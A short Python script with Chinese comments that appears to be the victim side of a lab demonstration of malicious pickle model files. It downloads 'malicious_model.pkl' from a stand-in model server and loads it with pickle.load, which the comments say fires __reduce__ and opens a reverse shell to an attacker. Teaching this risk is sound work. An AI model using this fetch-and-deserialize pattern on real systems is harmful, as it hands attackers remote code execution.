import urllib.request
import pickle

# model_server 的地址，模拟从 HuggingFace Hub 下载模型
MODEL_SERVER = "http://172.21.0.20:8080"

print("Downloading model from model server...")
# 下载模型文件到本地临时目录
urllib.request.urlretrieve(f"{MODEL_SERVER}/malicious_model.pkl", "/tmp/model.pkl")

print("Loading model...")
# pickle.load 触发 __reduce__，反弹 shell 连到攻击者
# 真实场景中受害者调用的是 torch.load()，原理完全相同
with open("/tmp/model.pkl", "rb") as f:
    pickle.load(f)